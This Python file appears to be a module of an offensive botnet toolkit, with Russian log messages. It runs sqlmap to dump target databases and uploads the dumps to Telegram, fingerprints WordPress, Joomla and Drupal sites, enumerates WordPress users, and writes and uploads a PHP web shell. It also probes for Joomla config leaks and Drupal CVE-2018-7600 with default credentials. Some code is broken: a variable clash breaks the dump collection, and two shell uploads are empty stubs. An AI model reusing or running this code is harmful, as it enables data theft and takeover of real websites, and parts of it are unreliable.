import subprocess, json, os, re, requests
from utils.logger import log
from botnet.exfil_sender import ExfilSender

class SQLInjector:
    def __init__(self, url, cookie=None, data=None):
        self.url = url
        self.cookie = cookie
        self.data = data
        self.output_dir = "./loot/sqlmap"

    def run(self, mode='--dump'):
        cmd = ['sqlmap', '-u', self.url, '--batch', '--random-agent', '--output-dir', self.output_dir]
        if self.cookie: cmd += ['--cookie', self.cookie]
        if self.data: cmd += ['--data', self.data]
        if mode == '--dump': cmd += ['--dump']
        elif mode == '--dbs': cmd += ['--dbs']
        log(f"[SQLi] sqlmap: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True)
        log(f"[SQLi] Результат:\n{result.stdout}")
        if mode == '--dump' and result.returncode == 0:
            self.auto_send()
        return result.stdout

    def auto_send(self):
        files = []
        for root, dirs, files in os.walk(self.output_dir):
            for f in files:
                if f.endswith('.csv') or f.endswith('.sql'):
                    files.append(os.path.join(root, f))
        if files:
            sender = ExfilSender()
            archive = sender.archive_files(files, "sqli_dump.zip")
            sender.telegram_upload(archive)
            log("[SQLi] Дамп отправлен в Telegram")


class CMSScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.cms_type = None

    def detect(self):
        try:
            r = requests.get(self.target_url, timeout=5)
            if 'wp-content' in r.text or 'wp-json' in r.text:
                self.cms_type = 'wordpress'
            elif 'Joomla' in r.text or 'joomla' in r.text:
                self.cms_type = 'joomla'
            elif 'Drupal' in r.text:
                self.cms_type = 'drupal'
            log(f"[CMS] Обнаружена CMS: {self.cms_type}")
            return self.cms_type
        except Exception as e:
            log(f"[CMS] Ошибка детекта: {e}")
            return None

    def exploit_wordpress(self):
        user_url = self.target_url.rstrip('/') + '/wp-json/wp/v2/users'
        try:
            resp = requests.get(user_url, timeout=5)
            if resp.status_code == 200 and resp.json():
                log(f"[WP] Обнаружены пользователи: {resp.json()}")
                self.upload_shell_wordpress()
                return resp.text
        except Exception as e:
            log(f"[WP] Ошибка: {e}")
        return None

    def upload_shell_wordpress(self):
        shell_path = 'shell.php'
        with open(shell_path, 'w') as f:
            f.write('<?php system($_GET["cmd"]); ?>')
        files = {'pluginzip': open(shell_path, 'rb')}
        upload_url = self.target_url.rstrip('/') + '/wp-admin/admin-ajax.php?action=uploadplugin'
        try:
            resp = requests.post(upload_url, files=files)
            if resp.status_code == 200:
                log(f"[WP] Веб-шелл загружен: {self.target_url}/wp-content/plugins/shell.php")
        except Exception as e:
            log(f"[WP] Не удалось загрузить шелл: {e}")

    def exploit_joomla(self):
        api_url = self.target_url.rstrip('/') + '/api/index.php/v1/config/application?public=true'
        try:
            resp = requests.get(api_url, timeout=5)
            if resp.status_code == 200:
                log(f"[Joomla] Конфигурация: {resp.text}")
                self.upload_shell_joomla()
                return resp.text
        except Exception as e:
            log(f"[Joomla] Ошибка: {e}")
        return None

    def upload_shell_joomla(self):
        pass

    def exploit_drupal(self):
        payload = {
            'form_id': 'user_login_form',
            'name': 'admin',
            'pass': 'admin',
            'form_build_id': '',
            'op': 'Log in'
        }
        post_url = self.target_url.rstrip('/') + '/user/login'
        try:
            resp = requests.post(post_url, data=payload, timeout=5)
            if 'unexpected error' in resp.text.lower():
                log(f"[Drupal] Возможна уязвимость CVE-2018-7600")
                self.upload_shell_drupal()
                return True
        except Exception as e:
            log(f"[Drupal] Ошибка: {e}")
        return False

    def upload_shell_drupal(self):
        pass

    def exploit(self):
        if not self.cms_type:
            self.detect()
        if self.cms_type == 'wordpress':
            self.exploit_wordpress()
        elif self.cms_type == 'joomla':
            self.exploit_joomla()
        elif self.cms_type == 'drupal':
            self.exploit_drupal()
